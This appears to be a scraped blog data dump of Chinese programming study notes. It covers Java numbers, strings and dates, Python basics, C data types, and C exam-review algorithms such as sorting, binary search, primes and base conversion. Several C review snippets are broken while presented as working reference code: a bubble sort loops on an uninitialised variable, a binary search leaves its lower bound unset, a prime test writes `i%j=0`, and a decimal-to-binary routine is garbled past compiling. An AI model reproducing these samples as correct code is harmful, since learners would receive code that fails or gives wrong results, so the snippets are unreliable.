String.valueOf(i); //方法2 Integer it = i; String str2 = it.toString(); &#125;&#125; 调用Integer的静态方法parseIntpackage digit; public class TestNumber &#123; public static void main(String[] args) &#123; String str = &quot;999&quot;; int i= Integer.parseInt(str); System.out.println(i); &#125;&#125; java.lang.Math数学方法 package digit; public class TestNumber &#123; public static void main(String[] args) &#123; float f1 = 5.4f; float f2 = 5.5f; //5.4四舍五入即5 System.out.println(Math.round(f1)); //5.5四舍五入即6 System.out.println(Math.round(f2)); //得到一个0-1之间的随机浮点数（取不到1） System.out.println(Math.random()); //得到一个0-10之间的随机整数 （取不到10） System.out.println((int)( Math.random()*10)); //开方 System.out.println(Math.sqrt(9)); //次方（2的4次方） System.out.println(Math.pow(2,4)); //π System.out.println(Math.PI); //自然常数 System.out.println(Math.E); &#125;&#125; 格式化%s 表示字符串%d 表示数字%n 表示换行 package digit; public class TestNumber &#123; public static void main(String[] args) &#123; String name =&quot;盖伦&quot;; int kill = 8; String title=&quot;超神&quot;; //直接使用+进行字符串连接，编码感觉会比较繁琐，并且维护性差,易读性差 String sentence = name+ &quot; 在进行了连续 &quot; + kill + &quot; 次击杀后，获得了 &quot; + title +&quot; 的称号&quot;; System.out.println(sentence); //使用格式化输出 //%s表示字符串，%d表示数字,%n表示换行 String sentenceFormat =&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;; System.out.printf(sentenceFormat,name,kill,title); printf package digit; public class TestNumber &#123; public static void main(String[] args) &#123; String name =&quot;盖伦&quot;; int kill = 8; String title=&quot;超神&quot;; String sentenceFormat =&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;; //使用printf格式化输出 System.out.printf(sentenceFormat,name,kill,title); //使用format格式化输出 System.out.format(sentenceFormat,name,kill,title); &#125;&#125; 换行符就是另起一行 — ‘\\n’ 换行（newline）回车符就是回到一行的开头 — ‘\\r’ 回车（return）在eclipse里敲一个回车，实际上是回车换行符 package digit; import java.util.Locale; public class TestNumber &#123; public static void main(String[] args) &#123; int year = 2020; //总长度，左对齐，补0，千位分隔符，小数点位数，本地化表达 //直接打印数字 System.out.format(&quot;%d%n&quot;,year); //总长度是8,默认右对齐 System.out.format(&quot;%8d%n&quot;,year); //总长度是8,左对齐 System.out.format(&quot;%-8d%n&quot;,year); //总长度是8,不够补0 System.out.format(&quot;%08d%n&quot;,year); //千位分隔符 System.out.format(&quot;%,8d%n&quot;,year*10000); //小数点位数 System.out.format(&quot;%.2f%n&quot;,Math.PI); //不同国家的千位分隔符 System.out.format(Locale.FRANCE,&quot;%,.2f%n&quot;,Math.PI*10000); System.out.format(Locale.US,&quot;%,.2f%n&quot;,Math.PI*10000); System.out.format(Locale.UK,&quot;%,.2f%n&quot;,Math.PI*10000); &#125;&#125; 字符:保存一个字符的时候使用char char对应的封装类是Character package character; public class TestChar &#123; public static void main(String[] args) &#123; System.out.println(Character.isLetter(&#x27;a&#x27;));//判断是否为字母 System.out.println(Character.isDigit(&#x27;a&#x27;)); //判断是否为数字 System.out.println(Character.isWhitespace(&#x27; &#x27;)); //是否是空白 System.out.println(Character.isUpperCase(&#x27;a&#x27;)); //是否是大写 System.out.println(Character.isLowerCase(&#x27;a&#x27;)); //是否是小写 System.out.println(Character.toUpperCase(&#x27;a&#x27;)); //转换为大写 System.out.println(Character.toLowerCase(&#x27;A&#x27;)); //转换为小写 String a = &#x27;a&#x27;; //不能够直接把一个字符转换成字符串 String a2 = Character.toString(&#x27;a&#x27;); //转换为字符串 &#125;&#125; length方法返回当前字符串的长度 charAt 获取字符 示例代码 toCharArray 获取对应的字符数组 示例代码 subString 截取子字符串 示例代码 split 分隔 示例代码 trim 去掉首尾空格 示例代码 toLowerCase toUpperCase 大小写 示例代码 indexOf lastIndexOf contains 定位 示例代码 replaceAll replaceFirst 使用equals进行字符串内容的比较，必须大小写一致equalsIgnoreCase，忽略大小写判断内容是否一致 package character; public class TestString &#123; public static void main(String[] args) &#123; String str1 = &quot;the light&quot;; String start = &quot;the&quot;; String end = &quot;Ight&quot;; System.out.println(str1.startsWith(start));//以...开始 System.out.println(str1.endsWith(end));//以...结束 &#125; &#125; package character; public class TestString &#123; public static void main(String[] args) &#123; String str1 = &quot;let there &quot;; StringBuffer sb = new StringBuffer(str1); //根据str1创建一个StringBuffer对象 sb.append(&quot;be light&quot;); //在最后追加 System.out.println(sb); sb.delete(4, 10);//删除4-10之间的字符 System.out.println(sb); sb.insert(4, &quot;there &quot;);//在4这个位置插入 there System.out.println(sb); sb.reverse(); //反转 System.out.println(sb); &#125; &#125; 时间日历package date; //import java.util.Date; public class TestDate &#123; public static void main(String[] args) &#123; // 当前时间 Date d1 = new Date(); System.out.println(&quot;当前时间:&quot;); System.out.println(d1); System.out.println(); // 从1970年1月1日 早上8点0分0秒 开始经历的毫秒数 Date d2 = new Date(5000); System.out.println(&quot;从1970年1月1日 早上8点0分0秒 开始经历了5秒的时间&quot;); System.out.println(d2); &#125;&#125; package date; //import java.util.Date; public class TestDate &#123; public static void main(String[] args) &#123; //注意：是java.util.Date; //而非 java.sql.Date，此类是给数据库访问的时候使用的 Date now= new Date(); //打印当前时间 System.out.println(&quot;当前时间:&quot;+now.toString()); //getTime() 得到一个long型的整数 //这个整数代表 1970.1.1 08:00:00:000，每经历一毫秒，增加1 System.out.println(&quot;当前时间getTime()返回的值是：&quot;+now.getTime()); Date zero = new Date(0); System.out.println(&quot;用0作为构造方法，得到的日期是:&quot;+zero); &#125;&#125; System.out.println(&quot;System.currentTimeMillis() \\t返回值: &quot;+System.currentTimeMillis()); package` `date; //import` `java.text.SimpleDateFormat;import` `java.util.Date; public` `class` `TestDate &#123; ``public` `static` `void` `main(String[] args) &#123; ``//y 代表年 ``//M 代表月 ``//d 代表日 ``//H 代表24进制的小时 ``//h 代表12进制的小时 ``//m 代表分钟 ``//s 代表秒 ``//S 代表毫秒 ``SimpleDateFormat sdf =``new` `SimpleDateFormat(``&quot;yyyy-MM-dd HH:mm:ss SSS&quot;` `); ``Date d= ``new` `Date(); ``String str = sdf.format(d); ``System.out.println(``&quot;当前时间通过 yyyy-MM-dd HH:mm:ss SSS 格式化后的输出: &quot;``+str); ``SimpleDateFormat sdf1 =``new` `SimpleDateFormat(``&quot;yyyy-MM-dd&quot;` `); ``Date d1= ``new` `Date(); ``String str1 = sdf1.format(d1); ``System.out.println(``&quot;当前时间通过 yyyy-MM-dd 格式化后的输出: &quot;``+str1); ``&#125;&#125; package date; //import java.util.Calendar;import java.util.Date; public class TestDate &#123; public static void main(String[] args) &#123; //采用单例模式获取日历对象Calendar.getInstance(); Calendar c = Calendar.getInstance(); //通过日历对象得到日期对象 Date d = c.getTime(); Date d2 = new Date(0); c.setTime(d2); //把这个日历，调成日期 : 1970.1.1 08:00:00 &#125;&#125; package date; import java.text.SimpleDateFormat;//import java.util.Calendar;import java.util.Date; public class TestDate &#123; private static SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); public static void main(String[] args) &#123; Calendar c = Calendar.getInstance(); Date now = c.getTime(); // 当前日期 System.out.println(&quot;当前日期：\\t&quot; + format(c.getTime())); // 下个月的今天 c.setTime(now); c.add(Calendar.MONTH, 1); System.out.println(&quot;下个月的今天:\\t&quot; +format(c.getTime())); // 去年的今天 c.setTime(now); c.add(Calendar.YEAR, -1); System.out.println(&quot;去年的今天:\\t&quot; +format(c.getTime())); // 上个月的第三天 c.setTime(now); c.add(Calendar.MONTH, -1); c.set(Calendar.DATE, 3); System.out.println(&quot;上个月的第三天:\\t&quot; +format(c.getTime())); &#125; private static String format(Date time) &#123; return sdf.format(time); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/tags/java/"}]},{"title":"python","slug":"python","date":"2024-02-25T16:00:00.000Z","updated":"2024-06-06T06:11:38.553Z","comments":true,"path":"2024/02/26/python/","permalink":"https://mengnankk.top/2024/02/26/python/","excerpt":"","text":"python变量和类型常见的数据类型：整型：int类型支持二进制八进制十六进制的转换 浮点型： 字符串类型：以单引号和双信号引起来的任意文本，字符串还有原始字符串表示法，unicode表示法等。 布尔型;只有True False两种值(注意大小写) 复数型：这个不常用 变量命名 硬性规则： 变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。 大小写敏感（大写的a和小写的A是两个不同的变量）。 不要跟关键字（有特殊含义的单词，后面会讲到）和系统保留字（如函数、模块等的名字）冲突。 PEP 8要求： 用小写字母拼写，多个单词用下划线连接。 受保护的实例属性用单个下划线开头（后面会讲到）。 私有的实例属性用两个下划线开头（后面会讲到）。 数据类型的转换： int()：将一个数值或字符串转换成整数，可以指定进制。 float()：将一个字符串转换成浮点数。 str()：将指定的对象转换成字符串形式，可以指定编码。 chr()：将整数转换成该编码对应的字符串（一个字符）。 ord()：将字符串（一个字符）转换成对应的编码（整数）。 运算符： 运算符 描述 [] [:] 下标，切片 ** 指数 ~ + - 按位取反, 正负号 * / % // 乘，除，模，整除 + - 加，减 &gt;&gt; &lt;&lt; 右移，左移 &amp; 按位与 ^ | 按位异或，按位或 &lt;= &lt; &gt; &gt;= 小于等于，小于，大于，大于等于 == != 等于，不等于 is is not 身份运算符 in not in 成员运算符 not or and 逻辑运算符 = += -= *= /= %= //= **= &amp;= &#96; &#x3D; ^&#x3D; &gt;&gt;&#x3D; &lt;&lt;&#x3D;&#96; python的分支结构python中代码的结构层次采用缩进的方式来表示，if如果要执行多条语句，只需要保持多条语句有相同的缩进即可，通常使用四个空格。 ifx = float(input(&#x27;x = &#x27;))if x &gt; 1: y = 3 * x - 5else: if x &gt;= -1: y = x + 2 else: y = 5 * x + 3print(&#x27;f(%.2f) = %.2f&#x27; % (x, y)) for-in循环如果明确知道循环的执行次数，或者要对一个容器进行迭代建议使用for-in循环。例如：计算1~100求和的结果 sum = 0for x in range(101): sum += xprint(sum) 需要说明的是上面代码中的range(1, 101)可以用来构造一个从1到100的范围，当我们把这样一个范围放到for-in循环中，就可以通过前面的循环变量x依次取出从1到100的整数。当然，range的用法非常灵活，下面给出了一个例子： range(101)：可以用来产生0到100范围的整数，需要注意的是取不到101。 range(1, 101)：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。 range(1, 101, 2)：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。 range(100, 0, -2)：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。 whlie循环如果要构造不知道具体循环次数的循环结构，我们推荐使用while循环。while循环通过一个能够产生或转换出bool值的表达式来控制循环，表达式的值为True则继续循环；表达式的值为False则结束循环。 例如下面的猜数字小游戏 import randomanswer = random.randint(1, 100)counter = 0while True: counter += 1 number = int(input(&#x27;请输入: &#x27;)) if number &lt; answer: print(&#x27;大一点&#x27;) elif number &gt; answer: print(&#x27;小一点&#x27;) else: print(&#x27;恭喜你猜对了!&#x27;) breakprint(&#x27;你总共猜了%d次&#x27; % counter)if counter &gt; 7: print(&#x27;你的智商余额明显不足&#x27;) python函数的应用定义函数：在Python中可以使用def关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过return关键字来返回一个值，这相当于数学上说的函数的因变量。 阶乘函数:自定义，其中在math库中factorial为阶乘函数 def fac(num): result = 1 for n in range(1, num + 1): result *= n return result Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持函数的重载，因为我们在定义一个函数的时候可以让它有多种不同的使用方式。 引用函数： import module1 as m1import module2 as m2m1.foo()m2.foo() from module1 import foofrom module2 import foo# 输出goodbye, world!foo() 如果写成上面这个样子，那么输出的即为最后一个foo,会将前面的覆盖。 字符串和常用数据结构所谓字符串，就是由零个或多个字符组成的有限序列，，如果我们把单个或多个字符用单引号或者双引号包围起来，就可以表示一个字符串。 可以在字符串中使用\\（反斜杠）来表示转义，也就是说\\后面的字符不再是它原来的意义，例如：\\n不是代表反斜杠和字符n，而是表示换行；而\\t也不是代表反斜杠和字符t，而是表示制表符。所以如果想在字符串中表示&#39;要写成\\&#39;，同理想表示\\要写成\\\\。可以运行下面的代码看看会输出什么。 如果不希望字符串中的\\表示转义，我们可以通过在字符串的最前面加上字母r来加以说明。 Python为字符串类型提供了非常丰富的运算符，我们可以使用+运算符来实现字符串的拼接，可以使用*运算符来重复一个字符串的内容，可以使用in和not in来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用[]和[:]运算符从字符串取出某个字符或某些字符（切片运算）。例如下面： s1 = &#x27;hello &#x27; * 3print(s1) # hello hello hello s2 = &#x27;world&#x27;s1 += s2print(s1) # hello hello hello worldprint(&#x27;ll&#x27; in s1) # Trueprint(&#x27;good&#x27; in s1) # Falsestr2 = &#x27;abc123456&#x27;# 从字符串中取出指定位置的字符(下标运算)print(str2[2]) # c# 字符串切片(从指定的开始索引到指定的结束索引)print(str2[2:5]) # c12print(str2[2:]) # c123456print(str2[2::2]) # c246print(str2[::2]) # ac246print(str2[::-1]) # 654321cbaprint(str2[-3:-1]) # 45 对字符串的处理： str1 = &#x27;hello, world!&#x27;# 通过内置函数len计算字符串的长度print(len(str1)) # 13# 获得字符串首字母大写的拷贝print(str1.capitalize()) # Hello, world!# 获得字符串每个单词首字母大写的拷贝print(str1.title()) # Hello, World!# 获得字符串变大写后的拷贝print(str1.upper()) # HELLO, WORLD!# 从字符串中查找子串所在位置print(str1.find(&#x27;or&#x27;)) # 8print(str1.find(&#x27;shit&#x27;)) # -1# 与find类似但找不到子串时会引发异常# print(str1.index(&#x27;or&#x27;))# print(str1.index(&#x27;shit&#x27;))# 检查字符串是否以指定的字符串开头print(str1.startswith(&#x27;He&#x27;)) # Falseprint(str1.startswith(&#x27;hel&#x27;)) # True# 检查字符串是否以指定的字符串结尾print(str1.endswith(&#x27;!&#x27;)) # True# 将字符串以指定的宽度居中并在两侧填充指定的字符print(str1.center(50, &#x27;*&#x27;))# 将字符串以指定的宽度靠右放置左侧填充指定的字符print(str1.rjust(50, &#x27; &#x27;))str2 = &#x27;abc123456&#x27;# 检查字符串是否由数字构成print(str2.isdigit()) # False# 检查字符串是否以字母构成print(str2.isalpha()) # False# 检查字符串是否以数字和字母构成print(str2.isalnum()) # Truestr3 = &#x27; jackfrued@126.com &#x27;print(str3)# 获得字符串修剪左右两侧空格之后的拷贝print(str3.strip()) a*b&#x3D;多少的简洁写法 a, b = 5, 10print(f&#x27;&#123;a&#125; * &#123;b&#125; = &#123;a * b&#125;&#x27;) 接下来我们要介绍的列表（list），也是一种结构化的、非标量类型，它是值的有序序列，每个值都可以通过索引进行标识，定义列表可以将列表的元素放在[]中，多个元素用,进行分隔，可以使用for循环对列表元素进行遍历，也可以使用[]或[:]运算符取出列表中的一个或多个元素。 list1 = [1, 3, 5, 7, 100]print(list1) # [1, 3, 5, 7, 100]# 乘号表示列表元素的重复list2 = [&#x27;hello&#x27;] * 3print(list2) # [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]# 计算列表长度(元素个数)print(len(list1)) # 5# 下标(索引)运算print(list1[0]) # 1print(list1[4]) # 100# print(list1[5]) # IndexError: list index out of rangeprint(list1[-1]) # 100print(list1[-3]) # 5list1[2] = 300print(list1) # [1, 3, 300, 7, 100]# 通过循环用下标遍历列表元素for index in range(len(list1)): print(list1[index])# 通过for循环遍历列表元素for elem in list1: print(elem)# 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值for index, elem in enumerate(list1): print(index, elem) list1 = [1, 3, 5, 7, 100]# 添加元素list1.append(200)list1.insert(1, 400)# 合并两个列表# list1.extend([1000, 2000])list1 += [1000, 2000]print(list1) # [1, 400, 3, 5, 7, 100, 200, 1000, 2000]print(len(list1)) # 9# 先通过成员运算判断元素是否在列表中，如果存在就删除该元素if 3 in list1: list1.remove(3)if 1234 in list1: list1.remove(1234)print(list1) # [1, 400, 5, 7, 100, 200, 1000, 2000]# 从指定的位置删除元素list1.pop(0)list1.pop(len(list1) - 1)print(list1) # [400, 5, 7, 100, 200, 1000]# 清空列表元素list1.clear()print(list1) # [] 面向对象编程定义类class定义类 class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print(&#x27;%s正在学习%s.&#x27; % (self.name, course_name)) # PEP 8要求标识符的名字用全小写多个单词用下划线连接 # 但是部分程序员和公司更倾向于使用驼峰命名法(驼峰标识) def watch_movie(self): if self.age &lt; 18: print(&#x27;%s只能观看《熊出没》.&#x27; % self.name) else: print(&#x27;%s正在观看岛国爱情大电影.&#x27; % self.name) 创建和使用对象def main(): # 创建学生对象并指定姓名和年龄 stu1 = Student(&#x27;骆昊&#x27;, 38) # 给对象发study消息 stu1.study(&#x27;Python程序设计&#x27;) # 给对象发watch_av消息 stu1.watch_movie() stu2 = Student(&#x27;王大锤&#x27;, 15) stu2.study(&#x27;思想品德&#x27;) stu2.watch_movie()if __name__ == &#x27;__main__&#x27;: main() 练习： 1.定义一个类似描述数字的时钟 from time import sleepclass Clock(object): &quot;&quot;&quot;数字时钟&quot;&quot;&quot; def __init__(self, hour=0, minute=0, second=0): &quot;&quot;&quot;初始化方法 :param hour: 时 :param minute: 分 :param second: 秒 &quot;&quot;&quot; self._hour = hour self._minute = minute self._second = second def run(self): &quot;&quot;&quot;走字&quot;&quot;&quot; self._second += 1 if self._second == 60: self._second = 0 self._minute += 1 if self._minute == 60: self._minute = 0 self._hour += 1 if self._hour == 24: self._hour = 0 def show(self): &quot;&quot;&quot;显示时间&quot;&quot;&quot; return &#x27;%02d:%02d:%02d&#x27; % \\ (self._hour, self._minute, self._second)def main(): clock = Clock(23, 59, 58) while True: print(clock.show()) sleep(1) clock.run()if __name__ == &#x27;__main__&#x27;: main() 练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。 from math import sqrtclass Point(object): def __init__(self, x=0, y=0): &quot;&quot;&quot;初始化方法 :param x: 横坐标 :param y: 纵坐标 &quot;&quot;&quot; self.x = x self.y = y def move_to(self, x, y): &quot;&quot;&quot;移动到指定位置 :param x: 新的横坐标 &quot;param y: 新的纵坐标 &quot;&quot;&quot; self.x = x self.y = y def move_by(self, dx, dy): &quot;&quot;&quot;移动指定的增量 :param dx: 横坐标的增量 &quot;param dy: 纵坐标的增量 &quot;&quot;&quot; self.x += dx self.y += dy def distance_to(self, other): &quot;&quot;&quot;计算与另一个点的距离 :param other: 另一个点 &quot;&quot;&quot; dx = self.x - other.x dy = self.y - other.y return sqrt(dx ** 2 + dy ** 2) def __str__(self): return &#x27;(%s, %s)&#x27; % (str(self.x), str(self.y))def main(): p1 = Point(3, 5) p2 = Point() print(p1) print(p2) p2.move_by(-1, 2) print(p2) print(p1.distance_to(p2))if __name__ == &#x27;__main__&#x27;: main()","categories":[{"name":"python","slug":"python","permalink":"https://mengnankk.top/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://mengnankk.top/tags/python/"}]},{"title":"C","slug":"c","date":"2023-12-24T16:00:00.000Z","updated":"2024-06-06T06:41:44.335Z","comments":true,"path":"2023/12/25/c/","permalink":"https://mengnankk.top/2023/12/25/c/","excerpt":"","text":"c语言变量和数据类型数据类型（data type)数据是放在内存中的，变量是 给这块内存起的名字，有了变量就嫩找到并使用这份数据。 字符型 char 1 短整型 short 2 整型 int 4 长整型 long 4 单精度浮点型 float 4 双精度浮点型 double 8 无类型 void (最基本的数据类型,数字为数据的长度) 数据类型只在定义变量时指明，而且必须指明；使用变量时无需再指明，因为此时的数据类型已经确定了。 数据的输出我们可以使用puts来输出字符串，puts只能用来输出字符串。 而printf可以输出许多类型的数据. printf(&quot;%d&quot;,a); 其中%d叫做格式控制符,格式控制符均以%开头，后面跟其他的字符 %d 十进制 %c 字符 %s 字符串 %f小数 puts函数将较长的字符串可以分割成几个短的字符串 puts(&quot;s&quot; &quot;s&quot; &quot;s&quot;); C语言当中的整数int 一般占用四个字节，共计32bit，其数字非常大。 可以用short long让其内存占用更少或者更多。 占用字节数如下 2 ≤ short ≤ int ≤ long sizeof操作符获取某个数据类型的长度可以用sizeof操作符 sizeof 用来获取某个数据类型或变量所占用的字节数，如果后面跟的是变量名称，那么可以省略( )，如果跟的是数据类型，就必须带上( )。 %hd用来输出short int %d用来输出int %ld用来输出long int 二进制八进制十六进制进制的开头二进制的开头必须使用0b或者0B 八进制必须用0开头 十六进制由09字母af（A~F)组成，使用时必须使用0x或者0X开头 进制的printf​ short int long 八进制 %ho %o %lo 十进制 %hd %d %ld 十六进制 %hx %x %lx 大小写表示用大写还是小写来输出十六进制数 区分不同进制数字的一个简单办法就是，在输出时带上特定的前缀。在格式控制符中加上#即可输出前缀，例如 %#x、%#o、%#lX、%#ho 等。 c语言中的正负数c语言中把内存的最高位作为符号位。在编程语言中计数常常从0开始，0作为第一位。 不希望设置符号位的时候可以输入unsigned关键字 unsigned short a = 12; 这样就没有符号位了。 无符号数的输出 unsigned short unsigned int unsigned long 八进制% ho% o% lo 十进制 %hu %u %lu 十六进制 %hx 或者 %hX %x 或者 %X %lx 或者 %lX c语言中的小数 2.1E5 &#x3D; 2.1×105，其中 2.1 是尾数，5 是指数。 3.7E-2 &#x3D; 3.7×10-2，其中 3.7 是尾数，-2 是指数。 0.5E7 &#x3D; 0.5×107，其中 0.5 是尾数，7 是指数。 float为单精度 double为双精度 float占用四个字节 double占用8个字节 printf输出小数的格式 %f 以十进制形式输出 float 类型； %lf 以十进制形式输出 double 类型； %e 以指数形式输出 float 类型，输出结果中的 e 小写； %E 以指数形式输出 float 类型，输出结果中的 E 大写； %le 以指数形式输出 double 类型，输出结果中的 e 小写； %lE 以指数形式输出 double 类型，输出结果中的 E 大写。 其中规则%f 和 %lf 默认保留六位小数，不足六位以 0 补齐，超过六位按四舍五入截断。将整数赋值给 float 变量时会变成小数。 以指数形式输出小数时，输出结果为科学计数法；也就是说，尾数部分的取值为：0 ≤ 尾数 &lt; 10。 小数的默认类型为double 将整数赋值给小数加0即可，将小说&#x3D;数赋值给整数只能取其整数部分。 字符字符的经常类型为char 长度为1，只能容纳 ASCII 码表中的字符，也就是英文字符。字符类型由单引号&#39; &#39;包围，字符串由双引号&quot; &quot;包围。其中空格也是一个字符，在使用printf输出字符是，char对应的格式控制符为%c 转义字符串： 以\\或者\\x开头，以\\开头表示后跟八进制形式的编码值，以\\x开头表示后跟十六进制形式的编码值。对于转义字符来说，只能使用八进制或者十六进制。 转义字符的初衷是用于 ASCII 编码，所以它的取值范围有限： 八进制形式的转义字符最多后跟三个数字，也即\\ddd，最大取值是\\177； 十六进制形式的转义字符最多后跟两个数字，也即\\xdd，最大取值是\\x7f。 转义字符 意义 ASCII码值（十进制） \\a 响铃(BEL) 007 \\b 退格(BS) ，将当前位置移到前一列 008 \\f 换页(FF)，将当前位置移到下页开头 012 \\n 换行(LF) ，将当前位置移到下一行开头 010 \\r 回车(CR) ，将当前位置移到本行开头 013 \\t 水平制表(HT) 009 \\v 垂直制表(VT) 011 &#39; 单引号 039 &quot; 双引号 034 \\ 反斜杠 092 \\n和\\t是最常用的两个转义字符： \\n用来换行，让文本从下一行的开头输出，前面的章节中已经多次使用； \\t用来占位，一般相当于四个空格，或者 tab 键的功能。 强制转换 (type_name) expression type_name为新类型名称，expression为表达式","categories":[{"name":"C","slug":"C","permalink":"https://mengnankk.top/categories/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://mengnankk.top/tags/C/"}]},{"title":"C语言期末复习3","slug":"dayc3","date":"2023-12-24T16:00:00.000Z","updated":"2024-06-06T06:11:24.344Z","comments":true,"path":"2023/12/25/dayc3/","permalink":"https://mengnankk.top/2023/12/25/dayc3/","excerpt":"","text":"某年某月某日#include &lt;stdio.h&gt;void main()&#123; int year,month,day; scanf(&quot;%d %d&quot;,&amp;year,&amp;month); switch(month)&#123; case 1: case 3: case 5: case 7: case 8: case 10: case 12: day=31; break; case 4: case 6: case 9: case 11: day=30; break; case 2: day=(year%4==0&amp;&amp;year%100!=0||year%400==0)?29:28; &#125; printf(&quot;%d年%d月有%d天&quot;,year,month,day);&#125; 判断素数（函数）int is_prime(int a)&#123; int i =0; if(a&lt;=1)&#123; return -1; &#125; for(i=2;i&lt;=sqrt(a);i++)&#123; if(a%i==0)&#123; return 0; &#125; &#125; return 1;&#125; 冒泡排序void sortarr2(int a,int n)&#123; int i,j; for(i=0;j&lt;n-1;i++)&#123; for(j=1;j&lt;n-i;j++)&#123; if(a[j]&lt;a[j-1])&#123; int temp; temp=a[j-1]; a[j-1]=a[j]; a[j]=temp; &#125; &#125; &#125; return;&#125; 选择排序void sortarry1(int *a,int n)&#123; int i,j; for(i=0;i&lt;n-1;i++)&#123; for (j=i+1;j&lt;n;j++)&#123; if(a[i]&gt;a[j])&#123; int temp; temp=a[i]; a[i]=a[j]; a[j]=temp; &#125; &#125; &#125; return ;&#125; 二分查找int search(int* a,int key,int n)&#123; int first; int last=n-1; int mid=0; while(first&lt;last) &#123; mid=(first+last)/2; if(a[mid]&gt;=key) &#123; last=mid; &#125; else &#123; first=mid+1; &#125; &#125; if(a[last]==key)&#123; return mid; &#125; return -1&#125; 数组最大值平均数#include &lt;stdio.h&gt;#define MAX_N 100void main()&#123; float nums[MAX_N]; int n,i; float max,avg; printf(&quot;请输入数组个数n=&quot;); scanf(&quot;%d&quot;,&amp;n); for (i=0;i&lt;n;i++)&#123; scanf(&quot;%f&quot;,&amp;nums[i]); avg+=nums[i]; &#125; max=nums[0]; for(i=0;i&lt;n;i++) (max&lt;nums[i])?(max=nums[i]):max; printf(&quot;max=%.2f,avg=%.2f&quot;,max,avg/n);&#125; 素数判断#include &lt;stdio.h&gt;#include &lt;math.h&gt;void main ()&#123; int i,j,isprinme=1; for(i=2;i&lt;=100;i++)&#123; if (i==2||i==3) isprinme=1; else if (i%6==1&amp;&amp;i%6!=5) isprinme=0; else &#123; for(j=5;j&lt;sqrt(i);j+=6)&#123; if(i%j=0||i%(j+2)==0)&#123; isprinme=0; break; &#125; &#125; &#125; &#125; (isprinme==1)?printf(&quot;%d\\t&quot;,i):(isprinme=1);&#125; 水仙花数#include &lt;stdio.h&gt;#include &lt;math.h&gt;void main() &#123; int i; for (i=100;i&lt;1000;i++) (i==pow(i/100,3)+pow(i%10,3)+pow(i/10%10,3))?printf(&quot;%d\\t&quot;, i):0;&#125; 大小写转换#include &lt;stdio.h&gt;#define Max_n 100void main()&#123; char strs[Max_n]; int i=0; printf(&quot;请输入字符串&quot;); gets(strs); while(strs[i]!=&#x27;0&#x27;)&#123; if(strs[i]&gt;=65&amp;&amp;strs[i]&lt;=90) strs[i]+=32; printf(&quot;%c&quot;,strs[i++]); &#125;&#125; 杨辉三角的输出#include &lt;stdio.h&gt;int tri(int r,int c)&#123; return (c==1||c==r)?1:tri(r-1,c-1)+tri(r-1,c);&#125;void main()&#123; int i,j,n; printf(&quot;请输入杨辉三角的行数（1~20&quot;); scanf(&quot;%d&quot;,&amp;n); for(i=1;i&lt;=n;i++)&#123; for(j=0;j&lt;n-1;j++) printf(&quot;%c%c%c&quot;,32,32,32); for(j=1;j&lt;=i;j++) printf(&quot;%-6d&quot;,tri(i,j)); printf(&quot;\\n&quot;); &#125;&#125; 阶乘数的显示#include &lt;stdio.h&gt;int kn(int n)&#123; return (n==0)?1:n*kn(n-1);&#125;void main()&#123; int n,i; printf(&quot;请输入阶乘数n:&quot;); scanf(&quot;%d&quot;,&amp;n); printf(&quot;%d!=&quot;,n); for(i=n;i&gt;0;i--) (i!=1)?printf(&quot;%d*&quot;,i):printf(&quot;%d&quot;,i); printf(&quot;=%d&quot;,kn(n));&#125; 逆序输出数字#include &lt;stdio.h&gt;void main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); while(n&gt;0)&#123; (n%10!=0)?printf(&quot;%d&quot;,n%10):0; n/=10; &#125;&#125;","categories":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/tags/c/"}]},{"title":"C语言期末复习2","slug":"dayc2","date":"2023-12-03T16:00:00.000Z","updated":"2024-06-06T06:11:15.060Z","comments":true,"path":"2023/12/04/dayc2/","permalink":"https://mengnankk.top/2023/12/04/dayc2/","excerpt":"","text":"C语言常见代码汇总判断一个年份是闰年int isleapyear(int year)&#123;if ((year%4==0&amp;&amp;year%100!=0)||year%400==0)&#123;return 1;&#125;else&#123;return 0;&#125;&#125; 计算两个数的最大公约数（欧几里得算法）int gcd(int a,int b)&#123;if (b==0)&#123;return a;&#125;return gcd(b,a%b);//递归计算最大公约数&#125; 二进制数转换为十进制数int binarytodecimal(int binary)&#123;while(binary&gt;0)&#123;int reminder=binary%10;//获取最后一位数字decimal+=reminder*base;//将最后一位数字乘以对应权重加到结果中binary/=10;//去掉最后一位数字base*=2;//每次权重乘以2&#125;return decimal;//返回对应的十进制数&#125; 斐波那契数列（递归）int fibonacci(int n)&#123;if (n&lt;=1)&#123;return n;//斐波那契数列的前两个数是1&#125;return fibonacci(n-1)+fibonacci(n-2);//递归调用计算下一个数字&#125; 将一个十进制转化为二进制void decimaltobinary(int decimal)&#123;int innary[32],index=0;while(decimal&gt;0)&#123;binary[index++]=decimal%2decimal/=2;&#125;for (int i-=index-);i&gt;=;i--)&#123;printf(&quot;%d,binary[i];&#125;printf(&quot;\\n&quot;);&#125; 求一个数组中的最大值和最小值void findminmax(int arr[],int size)&#123;int min = arr[0],max = arr[0];for (int 